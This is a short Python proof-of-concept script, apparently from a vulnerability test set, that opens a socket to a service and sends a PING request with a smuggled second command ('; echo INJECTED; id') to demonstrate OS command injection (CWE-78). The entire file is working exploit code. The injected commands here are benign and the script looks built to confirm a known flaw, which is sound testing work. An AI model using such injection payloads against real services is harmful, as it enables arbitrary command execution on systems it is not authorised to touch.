#!/usr/bin/env python3
"""V2 - Command injection in PING (CWE-78).
The host argument is interpolated into a shell command, so a ';' appends an
attacker command. The INJECTED marker proves arbitrary command execution."""
import socket
import sys


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    payload = b"PING 127.0.0.1; echo INJECTED; id\n"
    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(payload)
        print("response:", s.recv(8192).decode("latin-1", "replace").strip())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
